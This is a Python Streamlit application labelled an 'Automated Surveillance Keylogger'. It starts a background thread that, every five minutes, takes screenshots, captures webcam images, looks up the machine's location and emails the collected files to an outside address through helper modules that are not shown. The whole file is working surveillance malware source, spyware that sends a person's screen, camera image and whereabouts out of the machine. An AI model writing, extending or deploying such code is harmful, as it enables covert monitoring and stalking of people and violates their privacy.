import os
import time
import threading
import streamlit as st

from utils.webcam_capture import capture_webcam
from utils.screenshot import take_screenshot
from utils.send_email import send_data_to_email
from utils.geolocation import get_location

# Folder paths
screenshot_folder = "logs/screenshots/"
webcam_folder = "logs/webcam/"
os.makedirs(screenshot_folder, exist_ok=True)
os.makedirs(webcam_folder, exist_ok=True)

# Background thread function
def background_capture():
    while True:
        try:
            # Capture screenshot
            screenshot_path = take_screenshot(screenshot_folder)
            print(f"[✔] Screenshot saved: {screenshot_path}")

            # Capture webcam
            webcam_path = capture_webcam(webcam_folder)
            print(f"[✔] Webcam saved: {webcam_path}")

            # Get location (used in send_email)
            location = get_location()
            print(f"[✔] Location: {location}")

            # Send everything via email
            send_data_to_email(screenshot_folder, webcam_folder)
            print("[✉️] Email sent successfully.\n")

        except Exception as e:
            print(f"[❌] Error: {e}")

        # Wait for 5 minutes before next capture
        time.sleep(300)

def main():
    st.title("Automated Surveillance Keylogger")
    st.warning("This app runs webcam, screenshot, and location capture every 5 minutes.")
    st.write("Logs are emailed automatically.")

    # Start background capture once
    if 'started' not in st.session_state:
        st.session_state.started = True
        threading.Thread(target=background_capture, daemon=True).start()
        st.success("Background capture started.")

if __name__ == "__main__":
    main()
